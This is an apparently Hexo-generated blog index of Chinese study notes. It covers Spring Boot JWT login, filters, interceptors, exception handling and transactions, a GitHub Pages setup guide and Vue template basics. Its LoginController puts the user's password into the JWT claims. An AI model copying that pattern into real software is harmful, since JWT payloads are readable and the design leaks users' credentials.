Claims parseJWT(String jwt){\n                Claims claims = Jwts.parser()\n                        .setSigningKey(signKey)\n                        .parseClaimsJws(jwt)\n                        .getBody();\n                return claims;\n        }\n}\n```\n\nLoginController\n\n```java\n@RestController\n@Slf4j\n@RequestMapping(\"/login\")\npublic class LoginController {\n\n        @Autowired\n        private EmpService empService;\n\n        @PostMapping\n        public Result login(@RequestBody Emp emp){\n                log.info(\"员工登录:{}\",emp);\n\n                Emp e = empService.login(emp);\n\n                if(e != null){ //用户登录成功\n                        Map<String,Object> claims = new HashMap<>();\n                        claims.put(\"id\",e.getId());\n                        claims.put(\"username\",e.getUsername());\n                        claims.put(\"password\",e.getPassword());\n                        claims.put(\"name\",e.getName());\n                        claims.put(\"gender\",e.getGender());\n                        claims.put(\"image\",e.getImage());\n                        claims.put(\"job\",e.getJob());\n\n                        String jwt = JWTUtils.generateJwt(claims);\n                        return Result.success(jwt);\n                }\n                return Result.error(\"用户名或密码错误\");\n        }\n}\n```\n\n测试\n\n![image-20250529194909979](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529194909979.png)\n\n### Filter过滤器\n\n![image-20250529195512844](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529195512844.png)\n\n![image-20250529195657748](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529195657748.png)\n\nfilterdemo\n\n```java\nimport jakarta.servlet.*;\nimport jakarta.servlet.annotation.WebFilter;\n\nimport java.io.IOException;\n\n@WebFilter(urlPatterns = \"/*\") //拦截所有\npublic class FilterDemo implements Filter {\n        @Override\n        public void init(FilterConfig filterConfig) throws ServletException {\n                System.out.println(\"init方法执行\");\n        }\n\n        @Override\n        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n                System.out.println(\"doFilter方法执行\");\n        }\n\n        @Override\n        public void destroy() {\n                System.out.println(\"destory方法执行\");\n        }\n}\n```\n\n启动类\n\n```java\n@ServletComponentScan //要加上这个，因为Filter不是SpringBoot的组件\n@SpringBootApplication\npublic class SpringMybatisDemoApplication {\n\n        public static void main(String[] args) {\n                SpringApplication.run(SpringMybatisDemoApplication.class, args);\n        }\n\n}\n```\n\n测试\n\n运行\n\n![image-20250529200352680](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529200352680.png)\n\n发送请求\n\n![image-20250529200408141](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529200408141.png)\n\n拦截到了请求\n\n![image-20250529200432232](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529200432232.png)\n\n拦截多次\n\n![image-20250529200523233](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529200523233.png)\n\n放行\n\n```java\n@Override\npublic void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        System.out.println(\"doFilter方法执行\");\n        filterChain.doFilter(servletRequest,servletResponse); //使用这个api进行放行数据\n}\n```\n\n销毁\n\n![image-20250529200715344](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529200715344.png)\n\n#### 详解\n\n![image-20250529200940615](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529200940615.png)\n\n放行后访问对应web资源后，还会再回到filter中，但是不会从头开始执行filter，从chain.filter后执行（只执行放行后逻辑）\n\n#### 拦截路径\n\n![image-20250529201536403](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529201536403.png)\n\n#### 过滤器链\n\n![image-20250529201848755](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529201848755.png)\n\n```java\n//filter1\n@WebFilter(urlPatterns = \"/*\") //拦截所有\npublic class FilterDemo implements Filter {\n        @Override\n        public void init(FilterConfig filterConfig) throws ServletException {\n                System.out.println(\"init方法执行\");\n        }\n\n        @Override\n        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n                System.out.println(\"Filter1拦截到请求...放行前\");\n                filterChain.doFilter(servletRequest,servletResponse);\n                System.out.println(\"Filter1拦截到请求...放行前\");\n        }\n\n        @Override\n        public void destroy() {\n                System.out.println(\"destory方法执行\");\n        }\n}\n```\n\n\n\n```java\n//filter2\n@WebFilter(urlPatterns = \"/*\")\npublic class FilterDemo2 implements Filter {\n        @Override\n        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n                System.out.println(\"Filter2拦截到请求...放行前\");\n                filterChain.doFilter(servletRequest,servletResponse);\n                System.out.println(\"Filter2拦截到请求...放行前\");\n        }\n}\n```\n\n![image-20250529202151562](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529202151562.png)\n\n![image-20250529202207046](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529202207046.png)\n\nfilterChain的doFilter会将请求/响应发送到下一个Filter，如果是最后一个Filter了，就访问web资源/响应数据给浏览器\n\n#### 案例-登录校验\n\n所有被拦截到的请求都要校验令牌吗?login不用，因为这步人家根本没有令牌\n\n拦截请求后，什么时候才可以放行，执行业务操作?有令牌，且令牌合法，否则返回未登录错误信息\n\n![image-20250529203043645](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529203043645.png)\n\nalibaba fastjson：将对象转换为json格式\n\n```xml\n<dependency>\n    <groupId>com.alibaba</groupId>\n    <artifactId>fastjson</artifactId>\n    <version>1.2.76</version>\n</dependency>\n```\n\n过滤器\n\n```java\n@Slf4j\n@WebFilter(urlPatterns = \"/*\")\npublic class WebFilter0 implements Filter {\n        @Override\n        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n                //1.获取url\n                HttpServletRequest request = (HttpServletRequest) servletRequest;\n                HttpServletResponse response = (HttpServletResponse) servletResponse;\n\n                StringBuffer url = request.getRequestURL();\n                //2.排除/login的请求路径\n                String ext = url.substring(url.lastIndexOf(\"/\"));\n                log.info(\"请求路径:{}\",ext);\n\n                if (\"/login\".equals(ext)) {\n                        log.info(\"登陆操作,放行\");\n                        filterChain.doFilter(servletRequest, servletResponse);\n                        return;\n\n                } else {\n                        //3.获取请求头中的token\n                        String jwt = request.getHeader(\"token\");\n                        //4.判断token存在性，不存在，返回未登录\n                        if (!StringUtils.hasLength(jwt)) { //使用StringUtils工具类判断jwt是否存在\n                                log.info(\"jwt不存在\");\n                                Result result = Result.error(\"NOT_LOGIN\");\n                                //手动将对象转换为json格式 alibaba fastJson\n                                String jsonString = JSONObject.toJSONString(result);\n                                //响应给浏览器\n                                response.getWriter().write(jsonString);\n                                return;\n                        }\n                        //5.token存在，判断合法性，若不合法，返回未登录\n                        try {\n                                Map<String, Object> claims = JWTUtils.parseJWT(jwt);\n                        } catch (Exception e) {\n                                e.printStackTrace();\n                                log.info(\"jwt非法\");\n                                Result result = Result.error(\"NOT_LOGIN\");\n                                //手动将对象转换为json格式 alibaba fastJson\n                                String jsonString = JSONObject.toJSONString(result);\n                                //响应给浏览器\n                                response.getWriter().write(jsonString);\n                                return;\n                        }\n                        //6.放行\n                        log.info(\"令牌校验通过\");\n                        filterChain.doFilter(servletRequest, servletResponse);\n                }\n        }\n}\n```\n\n测试\n\n![image-20250529205843699](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529205843699.png)\n\n![image-20250529205821793](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529205821793.png)\n\n![image-20250529210258306](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529210258306.png)\n\n![image-20250529210313027](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529210313027.png)\n\n### Interceptor拦截器\n\n类似于Filter，但不同的是，Interceptor是Spring框架提供的\n\n![image-20250529211148152](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529211148152.png)\n\n步骤\n\n定义拦截器\n\n![image-20250529211846682](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529211846682.png)\n\n```java\n@Component //后续需要被注册为bean\npublic class InterceptorTest implements HandlerInterceptor {\n        /**\n         * 目标资源方法执行前执行\n         * @param request\n         * @param response\n         * @param handler\n         * @return true:放行      false:不放行\n         * @throws Exception\n         */\n        @Override\n        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n                System.out.println(\"preHandle...\");\n                return true;\n        }\n\n        /**\n         * 目标资源方法执行后执行\n         * @param request\n         * @param response\n         * @param handler\n         * @param modelAndView\n         * @throws Exception\n         */\n        @Override\n        public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {\n                System.out.println(\"postHandle...\");\n        }\n\n        /**\n         * 视图渲染完毕后执行，最后执行\n         * @param request\n         * @param response\n         * @param handler\n         * @param ex\n         * @throws Exception\n         */\n        @Override\n        public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {\n                System.out.println(\"afterCompletion...\");\n        }\n}\n```\n\n注册拦截器\n\n![image-20250529212222108](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529212222108.png)\n\n```Java\n@Configuration //配置类\npublic class WebConfig implements WebMvcConfigurer {\n        @Autowired\n        private InterceptorTest interceptorTest;\n        @Override\n        public void addInterceptors(InterceptorRegistry registry) {\n                registry.addInterceptor(interceptorTest).addPathPatterns(\"/**\"); //注册拦截所有的拦截器\n        }\n}\n```\n\n测试\n\n拦截器中三个方法的顺序\n\n![image-20250529212546449](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529212546449.png)\n\n#### 详解\n\n拦截路径\n\n![image-20250529212831358](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529212831358.png)\n\n```java\n@Configuration //配置类\npublic class WebConfig implements WebMvcConfigurer {\n        @Autowired\n        private InterceptorTest interceptorTest;\n        @Override\n        public void addInterceptors(InterceptorRegistry registry) {\n                registry.addInterceptor(interceptorTest)\n                        .addPathPatterns(\"/**\") //注册拦截所有路径的拦截器\n                        .excludePathPatterns(\"/login\"); //排除拦截/login\n        }\n}\n```\n\n拦截流程\n\n![image-20250529213550109](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529213550109.png)\n\n与Filter的区别\n\nFilter:实现Filter接口，会拦截所有的资源\n\nInterceptor:实现HandlerInterceptor接口，只会拦截Spring环境内的资源\n\n#### 案例\n\n步骤与Filter中一致，不同的是，拦截器是否放行由返回值决定，而过滤器需要手动调用Chain.doFilter()\n\n定义拦截器\n\n```java\n@Component\n@Slf4j\npublic class SpringInterceptor implements HandlerInterceptor {\n        //Controller之前\n        @Override\n        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n                //1.获取url\n                StringBuffer url = request.getRequestURL();\n                log.info(\"url:{}\",url);\n                String ext = url.substring(url.lastIndexOf(\"/\"));\n                //2.排除/login的请求路径\n                if (\"/login\".equals(ext)) {\n                        log.info(\"登陆操作,放行\");\n                        return true;\n                }\n                //3.获取请求头中的token\n                String jwt = request.getHeader(\"token\");\n                //4.判断token存在性，不存在，返回未登录\n                if(!StringUtils.hasLength(jwt)){\n                        log.info(\"jwt不存在\");\n                        Result result = Result.error(\"NOT_LOGIN\");\n                        //手动将对象转换为json格式 alibaba fastJson\n                        String jsonString = JSONObject.toJSONString(result);\n                        //响应给浏览器\n                        response.getWriter().write(jsonString);\n                        return false;\n                }\n                //5.token存在，判断合法性，若不合法，返回未登录\n                try {\n                        Map<String, Object> claims = JWTUtils.parseJWT(jwt);\n                } catch (Exception e) {\n                        e.printStackTrace();\n                        log.info(\"jwt非法\");\n                        Result result = Result.error(\"NOT_LOGIN\");\n                        //手动将对象转换为json格式 alibaba fastJson\n                        String jsonString = JSONObject.toJSONString(result);\n                        //响应给浏览器\n                        response.getWriter().write(jsonString);\n                        return false;\n                }\n                //6.放行\n                log.info(\"令牌校验通过\");\n                return true;\n        }\n\n        @Override\n        public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {\n                HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);\n        }\n\n        @Override\n        public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {\n                HandlerInterceptor.super.afterCompletion(request, response, handler, ex);\n        }\n}\n```\n\n注册拦截器\n\n```java\n@Configuration //配置类\npublic class WebConfig implements WebMvcConfigurer {\n        @Autowired\n        private SpringInterceptor springInterceptor;\n        @Override\n        public void addInterceptors(InterceptorRegistry registry) {\n                registry.addInterceptor(springInterceptor)\n                        .addPathPatterns(\"/**\");//注册拦截所有路径的拦截器\n        }\n}\n```\n\n测试\n/login\n\n![image-20250529214857718](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529214857718.png)\n\n无token进行其他请求\n\n![image-20250529214924850](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529214924850.png)\n\n有token且token合法\n\n![image-20250529214948362](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529214948362.png)\n\ntoken非法\n\n![image-20250529215007637](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529215007637.png)\n\n# 异常处理\n\n在案例中,如果在新增部门处新增一个重复的部门，由于MySQL对部门这个字段做了unique约束，所以会引发异常\n\n![image-20250603214630788](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250603214630788.png)\n\nhttp状态码为500，服务器端异常\n\n![image-20250603214700032](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250603214700032.png)\n\n响应数据为\n\n```json\n{\"timestamp\":\"2025-06-03T13:46:51.851+00:00\",\"status\":500,\"error\":\"Internal Server Error\",\"path\":\"/depts\"}\n```\n\n并不是我们预先设定的Result格式\n\n```json\n{\n    \"code\":\n    \"msg\":\"\"\n    \"data\":\"\"\n}\n```\n\n所以前端无法处理框架抛出的异常\n\n![image-20250603214330999](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250603214330999.png)\n\n![image-20250603214952621](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250603214952621.png)\n\n## 全局异常处理器\n\n![image-20250603215116517](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250603215116517.png)\n\n```java\n@RestControllerAdvice\npublic class GlobalExceptionHandler {\n        @ExceptionHandler(Exception.class)//捕获所有异常\n        public Result handlerEx(Exception ex){\n                ex.printStackTrace();\n                return Result.error(\"操作失败\");\n        }\n}\n```\n\n# 事务管理\n\n![image-20250605204641821](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250605204641821.png)\n\n在原本的部门管理中，删除部门就仅仅只是把部门删了，但是该部门下的员工却并未删除\n\n![image-20250605205315386](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250605205315386.png)\n\n```java\n@Override\npublic void delete(Integer id) {\n    mapper.deleteById(id);\n}\n```\n\n如果我们只是简单加上一个根据部门id删除员工的操作，那么如果这两步操作之间出现了异常，就会导致数据不一致，因此这两步操作需要被封装成一个事务\n\n## @Transactional\n\n位置:Service层的类/方法/接口上\n\n作用:将当前方法交给spring进行事务管理，方法执行前，开启事务，成功执行完毕，提交事务，否则回滚事务\n\n我们需要在执行多次数据访问操作的方法上使用，查询不影响数据，单步操作如果失败，也会自动回滚\n\n```java\n@Override\n@Transactional\npublic void delete(Integer id) {\n    mapper.deleteById(id);\n    int i = 1/0;//模拟异常\n    mapper.deleteEmpByDeptId(id);\n}\n```\n\n控制台输出事务日志\n\n```yml\n#spring事务管理日志\nlogging:\n  level:\n    org.springframework.jdbc.support.JdbcTransactionManager: debug\n```\n\n引发异常\n\n![image-20250605210529774](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250605210529774.png)\n\n但是数据库中数据未发生变化\n\n![image-20250605210602745](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250605210602745.png)\n\n控制台日志\n\n![image-20250605214543960](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250605214543960.png)\n\n### rollbackFor\n\n@Transactional默认只会回滚RuntimeException及其子类异常，要想回滚其他异常，需要配置rollbackFor属性\n\n```java\n//回滚所有异常\n@Transactional(rollbackFor = Exception.class)\n```\n\n### propagation\n\n![image-20250605211957791](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250605211957791.png)\n\n![image-20250605212037642](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250605212037642.png)\n\n#### 案例\n\n![image-20250605212148057](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250605212148057.png)\n\n记录日志这步要放在finally中，这样就可以无论成功失败都能记录\n\nDeptLog对象\n\n```java\n@Data\n@AllArgsConstructor\n@NoArgsConstructor\npublic class DeptLog {\n        private LocalDateTime createTime;\n        private String description;\n}\n```\n\nService层\n\n```java\n@Service\npublic class DeptLogImpl implements DeptLogService {\n        @Autowired\n        private DeptLogMapper deptLogMapper;\n        @Override\n        @Transactional\n        public void insert(DeptLog deptLog) {\n                deptLogMapper.insert(deptLog);\n        }\n}\n```\n\nMapper层\n\n```java\n@Mapper\npublic interface DeptLogMapper {\n        @Insert(\"insert into dept_log values (#{createTime},#{description})\")\n        void insert(DeptLog deptLog);\n}\n```\n\n但是这么做，dept_log表中并不会添加日志\n\n控制台日志中\n\n![image-20250605215022842](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250605215022842.png)\n\n向dept_log表中插入数据的事务是直接加入到当前删除部门的事务的，所以当删除部门的方法遇到异常回滚时，向dept_log表中插入数据这个动作也回滚了，就没有插入数据\n\n将service层改为\n\n```java\n@Service\npublic class DeptLogImpl implements DeptLogService {\n        @Autowired\n        private DeptLogMapper deptLogMapper;\n        @Override\n        @Transactional(propagation = Propagation.REQUIRES_NEW)\n        public void insert(DeptLog deptLog) {\n                deptLogMapper.insert(deptLog);\n        }\n}\n```\n\n控制台日志\n\n删除部门的事务被挂起\n\n![image-20250605215539230](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250605215539230.png)\n\n完成插入日志信息的事务后，再完成删除部门的事务\n\n![image-20250605215652012](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250605215652012.png)\n\n删除部门回滚\n\n![image-20250605215721578](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250605215721578.png)\n\n插入数据成功\n\n![image-20250605215408118](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250605215408118.png)\n\n#### 使用场景\n\n![image-20250605215900731](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250605215900731.png)\n\n# AOP\n\nComming soon...","tags":["Web开发","JavaWeb"],"categories":["Web开发","JavaWeb"]},{"title":"搭建自己的GitHub-page","url":"/2025/05/21/搭建自己的github-Page/","content":"## 搭建自己的github-Page\n\n## 生成SSH Key\n\n```bash\nssh-keygen -t rsa -C \"github绑定邮箱\"\n```\n\n![image-20250513195944784](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513195944784.png)\n\n### 验证\n\n```bash\nssh -T git@github.com\n```\n\n![image-20250513200229358](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513200229358.png)\n\n## 新建自己的仓库\n\n<img src=\"https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513191047737.png\" alt=\"image-20250513191047737\" style=\"zoom:50%;\" />\n\n<img src=\"https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513191120846.png\" alt=\"image-20250513191120846\" style=\"zoom:50%;\" />\n\n<img src=\"https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513191210372.png\" alt=\"image-20250513191210372\" style=\"zoom:50%;\" />\n\n![image-20250513191358245](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513191358245.png)\n\n![image-20250513191544994](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513191544994.png)\n\n![image-20250513191602647](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513191602647.png)\n\n## 下载git\n\n下载链接:https://git-scm.com/downloads/win\n\n参考链接:https://blog.csdn.net/qq_39809160/article/details/145712755\n\n![image-20250513193916850](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513193916850.png)\n\n## 搭建本地博客\n\n### 创建博客目录\n\n![image-20250513194127783](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513194127783.png)\n\n### 安装hexo\n\n```bash\nnpm install -g hexo/cli\n```\n\n![image-20250513194449943](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513194449943.png)\n\n```bash\n#创建一个新的hexo项目\nhexo init myblogs\n```\n\n![image-20250513194437222](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513194437222.png)\n\n此时的目录结构\n\n![image-20250513194514738](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513194514738.png)\n\n![image-20250513194607097](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513194607097.png)\n\n```bash\ncd myblogs\nnpm install\n```\n\n此时项目结构\n\n![image-20250513194652661](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513194652661.png)\n\n运行hexo项目\n\n```bash\nhexo server\n```\n\n![image-20250513194810234](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513194810234.png)\n\n## 部署到github\n\n### 获取个人token\n\n<img src=\"https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513202956141.png\" alt=\"image-20250513202956141\" style=\"zoom: 50%;\" />\n\n![image-20250513203016847](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513203016847.png)\n\n<img src=\"https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513203107908.png\" alt=\"image-20250513203107908\" style=\"zoom: 50%;\" />\n\n\n\n### 打开_config.yml\n\n![image-20250513195002094](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513195002094.png)\n\n![image-20250513200438571](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513200438571.png)\n\n### 编辑_config.yml\n\n![image-20250513203319107](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513203319107.png)\n\n### 当前博客目录安装git插件\n\n```bash\nnpm install hexo-deployer-git --save\n```\n\n### 最后\n\n```bash\nhexo clean      # 清理 Hexo 缓存：\nhexo generate   # 重新生成静态文件\n#hexo deploy这步之前要先验证身份\n#git config --global user.email \"272510545@qq.com\"\n#git config --global user.name \"blkheadfish\"\nhexo deploy     # hexo deploy\n```\n\n![image-20250513201340009](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513201340009.png)\n\n## 博客路径\n\n![image-20250513201657835](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513201657835.png)\n\n## 博客配置项\n\n在_config.yml中\n\n修改浏览器tab页标题\n\n![image-20250513202340423](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513202340423.png)\n\n```bash\n#部署到github\nhexo g -d\n```\n\n![image-20250513201746360](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250513201746360.png)","tags":["杂项"]},{"title":"Vue学习笔记","url":"/2025/03/05/Vue/","content":"\n# 前期准备\n\n下载node.js,安装VueCLI\n\n```bash\nnpm install -g @vue/cli #-g 全局安装\nvue --version\n```\n\n## 创建项目\n\n![image-20250301182928730](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301182928730.png)\n\n```bash\nvue create 项目名 #项目名中不能有大写字母，可以有小写字母和-\n```\n\n![image-20250301182940607](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301182940607.png)\n\n## 项目结构\n\n![image-20250301182949806](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301182949806.png)\n\n在src下编写代码，其他是配置文件\n\nsrc/assets:存放静态文件（公共CSS文件，图片）\n\nsrc/components：公共组件\n\nApp.vue：根组件\n\nmain.js:主入口文件\n\n# 模板语法\n\n![image-20250301183009709](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301183009709.png)\n\n```html\n<template>\n  <div class=\"hello\">\n    <h3>学习模板语法</h3>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: 'HelloWorld',\n  props: {\n    msg: String\n  }\n}\n</script>\n<!-- <template>中是HTML，<script>中是业务逻辑-->\n```\n\n## 数据绑定\n\n![image-20250301183245974](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301183245974.png)\n\n双大括号搭配js中的data()函数,data()返回一个对象型数据\n\n```html\n<template>\n\t<div class=\"hello\">\n\t\t<h3>学习模板语法</h3>\n\t\t<span>{{ message }}</span>\n\t</div>\n</template>\n\n<script>\nexport default {\n\tname: 'HelloWorld',\n\tdata(){\n\t\treturn{\n\t\t\tmessage:'study'\n\t\t}\n\t}\n}\n</script>\n```\n\n结果：\n\n![image-20250301183647990](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301183647990.png)\n\n## 原始HTML\n\n![image-20250301183729876](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301183729876.png)\n\n{% raw %}{{}}与v-html区别就好比document.getElementById().innerHTML和document.getElementById().innerText的区别{% endraw %}\n\n```html\n<template>\n\t<div class=\"hello\">\n\t\t<h3>学习模板语法</h3>\n\t\t<span>{{ message }}</span>\n\t\t<span>{{ rawHtml }}</span>\n\t\t<p>v<span v-html=\"rawHtml\"></span></p>\n\t</div>\n</template>\n\n<script>\nexport default {\n\tname: 'HelloWorld',\n\tdata(){\n\t\treturn{\n\t\t\tmessage:'study',\n\t\t\trawHtml:'<a href=\"https://www.bilibili.com\">bilibili</a>'\n\t\t}\n\t}\n}\n</script>\n```\n\n![image-20250301184209600](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301184209600.png)\n\n## 属性Attribute\n\n![image-20250301215314417](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301215314417.png)\n\n```html\n<template>\n\t<div class=\"hello\">\n\t\t<h3>学习模板语法</h3>\n\t\t<span>{{ message }}</span>\n\t\t<span>{{ rawHtml }}</span>\n\t\t<p>v<span v-html=\"rawHtml\"></span></p>\n\t\t<span v-bind:id=\"Id\"></span>\n        <span :id=\"Id\"></span>\n\t</div>\n</template>\n\n<script>\nexport default {\n\tname: 'HelloWorld',\n\tdata(){\n\t\treturn{\n\t\t\tmessage:'study',\n\t\t\trawHtml:'<a href=\"https://www.bilibili.com\">bilibili</a>',\n\t\t\tId:114514\n\t\t}\n\t}\n}\n</script>\n```\n\n## 使用JavaScript表达式\n\n![image-20250301215705367](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301215705367.png)\n\n![image-20250301220643449](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301220643449.png)\n\n```html\n<template>\n\t<div class=\"hello\">\n\t\t<h3>学习模板语法</h3>\n\t\t<span>{{ message }}</span>\n\t\t<span>{{ rawHtml }}</span>\n\t\t<p>v<span v-html=\"rawHtml\"></span></p>\n\t\t<span v-bind:id=\"Id\"></span>\n\t\t<span>{{ flag?\"123\":\"456\" }}</span>\n\t\t<br>\n\t\t<span>{{ num+10 }}</span>\n\t</div>\n</template>\n\n<script>\nexport default {\n\tname: 'HelloWorld',\n\tdata(){\n\t\treturn{\n\t\t\tmessage:'study',\n\t\t\trawHtml:'<a href=\"https://www.bilibili.com\">bilibili</a>',\n\t\t\tId:114514,\n\t\t\tflag:true,\n\t\t\tnum:20\n\t\t}\n\t}\n}\n</script>\n```\n\n不能在双括号里++ -- +=，会引发无限递归，在 Vue 的模板中，每次渲染时都会执行这个表达式，导致 `num` 的值不断递增\n\n![image-20250301220417011](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301220417011.png)\n\n# 条件渲染\n\n## v-if\n\n![image-20250301220831076](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301220831076.png)\n\n```html\n<template>\n\t<div v-if=\"flag\">你好</div>\n</template>\n\n<script>\nexport default {\n\tdata(){\n\t\treturn{\n\t\t\tflag:true\n\t\t}\n\t}\n}\n</script>\n```\n\n## v-else\n\n![image-20250301221339380](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301221339380.png)\n\n```html\n<template>\n\t<div v-if=\"!flag\">你好</div>\n\t<div v-else>不好</div>\n</template>\n\n<script>\nexport default {\n\tdata(){\n\t\treturn{\n\t\t\tflag:true\n\t\t}\n\t}\n}\n</script>\n```\n\n## v-show\n\n![image-20250301221847964](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301221847964.png)\n\n```html\n<template>\n\t<div v-if=\"!flag\">你好</div>\n\t<div v-else>不好</div>\n\t<div v-show=\"flag\">芜湖</div>\n\t<div v-show=\"!flag\">不芜湖</div>\n</template>\n\n<script>\nexport default {\n\tdata(){\n\t\treturn{\n\t\t\tflag:true\n\t\t}\n\t}\n}\n</script>\n```\n\n![image-20250301222132146](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301222132146.png)\n\n即使!flag为false，不芜湖这句依然存在，只是css样式被替换\n\n# 列表渲染\n\n![image-20250301222654851](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301222654851.png)\n\n```html\n<template>\n        <li v-for=\"item in List\">\n                {{ item.message }}\n        </li>\n</template>\n\n<script>\nexport default {\n        data(){\n                return{\n                        List:[\n                                {message:\"1\"},\n         